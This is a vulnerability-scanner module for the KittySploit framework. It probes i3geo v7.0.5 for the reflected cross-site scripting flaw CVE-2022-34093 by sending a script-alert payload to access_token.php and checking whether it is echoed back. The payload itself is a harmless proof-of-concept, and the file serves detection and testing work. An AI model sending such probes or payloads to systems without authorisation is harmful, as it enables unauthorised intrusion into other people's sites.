#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Portal do Software Publico Brasileiro i3geo v7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Software Publico Brasileiro i3geo v7.0.5 - Cross-Site Scripting Detection',
        'description': 'Portal do Software Publico Brasileiro i3geo v7.0.5 was discovered to contain a cross-site scripting (XSS) vulnerability via access_token.php.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'i3geo', 'xss', 'softwarepublico', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2022-34093',
            'https://github.com/wagnerdracha/ProofOfConcept/blob/main/i3geo_proof_of_concept.txt#L44',
            'https://owasp.org/www-community/attacks/xss/',
            'https://softwarepublico.gov.br/social/i3geo',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2022-34093',
    }

    def run(self):
        r = self.http_request(method="GET", path='/i3geo/pacotes/linkedinoauth/example/access_token.php?=%3Cscript%3Ealert(document.domain)%3C/script%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html',)
        body_all = ('%3Cscript%3Ealert(document.domain)%3C/script%3E', 'Invalid consumer key',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="Software Publico Brasileiro i3geo v7.0.5 - Cross-Site Scripting detected",
                path='/i3geo/pacotes/linkedinoauth/example/access_token.php?=%3Cscript%3Ealert(document.domain)%3C/script%3E',
            )
            return True
        return False

